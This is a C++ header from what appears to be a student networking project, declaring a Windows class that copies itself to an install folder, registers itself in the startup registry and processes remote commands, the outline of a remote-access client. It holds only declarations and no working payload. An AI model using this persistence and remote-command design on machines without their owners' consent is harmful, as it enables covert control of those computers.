//
// Created by Berlingot on 2023-04-17.
//

#ifndef PROJET_FINAL_RESEAUX_RUNNING_H
#define PROJET_FINAL_RESEAUX_RUNNING_H


#include <Windows.h>
#include <string>
#include <tchar.h>
#include <stdio.h>
#include <time.h>
#include <fstream>
#include <thread>

#include "Settings.h"
#include "StringConvertion.h"
#include "CommandPrompt.h"
#include "utility.h"

class Running {
private:
    static bool processParameter(std::string &command, std::string compCommand);
protected:
public:
    //Variables
    static LPTSTR lpArguments;
    static std::string currentPath;			//Arborescence de fichier présente
    static std::string installFolder;		//Arborescence ou sera installé le fichier
    static std::string installPath;			//Arborescence ou se trouve l'executable
    static bool installing;			//bool - en train d'installer ou pas

    //Fonctions d'initialisation
    static bool initialisation(); //initialisation, lancer au démarage de l'application  // ============================Debut initialisation
    static std::string getCurrentPath();
    static std::string getInstallFolder();
    static std::string getInstallPath(const std::string& instFolder);
    static bool locationSet();
    static bool startupSet();
    static bool installed();
    static void setLocation();
    static bool directoryExists(const char* dirName);
    static bool regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName);	//checks if a certain value exists in the registry
    static void runInstalled();
    static void startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments);		//starts a process
    static bool setStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args);	//registers a program in startup with supplied name, path to exe and startup arguments
    //==================================================================================================================Fin Initialisation

    //Autres Fonctions
    static std::string processCommand(std::string command);

};


#endif //PROJET_FINAL_RESEAUX_RUNNING_H
